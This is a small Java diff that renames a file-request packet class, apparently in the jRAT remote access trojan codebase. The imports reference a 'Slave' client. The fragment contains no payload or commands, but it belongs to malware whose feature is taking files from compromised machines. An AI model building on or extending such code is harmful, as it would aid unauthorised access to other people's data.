@@ -5,11 +5,11 @@ import java.io.DataOutputStream;
 import se.jrat.client.Slave;
 
 
-public class Packet21GetFile extends AbstractOutgoingPacket {
+public class Packet21ServerDownloadFile extends AbstractOutgoingPacket {
 
 	private String file;
 
-	public Packet21GetFile(String file) {
+	public Packet21ServerDownloadFile(String file) {
 		this.file = file;
 	}
 
